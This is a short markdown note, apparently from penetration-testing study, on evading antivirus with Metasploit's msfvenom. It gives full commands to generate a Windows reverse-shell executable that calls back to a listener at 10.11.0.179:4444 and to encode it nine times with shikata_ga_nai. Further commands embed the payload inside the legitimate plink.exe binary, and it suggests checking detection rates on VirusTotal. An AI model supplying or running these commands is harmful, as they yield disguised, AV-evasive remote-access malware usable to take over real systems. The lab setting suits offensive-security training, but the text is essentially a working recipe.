# Avoid Antivirus
> the `msfpayload` and `msfencode` have beeb depricated in Metasploit in favour of `msfvenom` - however the results of the following experiment would stay the same.  

## msfvenom
- `msfvenom --list payloads`
- `msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.179 LPORT=4444 -o shell_reverse.exe`  
- `msfvenom -p windows/shell_reverse_tcp -o reverse_shell_tcp.exe --platform windows --arch x86 LHOST=10.11.0.179 LPORT=4444`

> we'll submit our executable to `virustotal` [https://www.virustotal.com/gui/home]
> we'll manipulate our reverse_shell executable further in order to try and avoid as many AV's as possible.

## encoders
```
msfvenom -l encoders
x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
```
> we'll now generate our reverse shell payload via `shikata_ga_nai` encoder, 9 times.
- `msfvenom --payload windows/shell_reverse_tcp --out reverse_shell_tcp.exe --encoder x86/shikata_ga_nai --iterations 9 --platform windows --arch x86 LHOST=10.11.0.179 LPORT=4444`

## embeddint in executables
> we'll Specify a custom executable file to use as a template
- `msfvenom --payload windows/shell_reverse_tcp --out reverse_shell_tcp_embedded.exe --encoder x86/shikata_ga_nai --iterations 9 --platform windows --arch x86 -x /usr/share/windows-binaries/plink.exe LHOST=10.11.0.179 LPORT=4444`
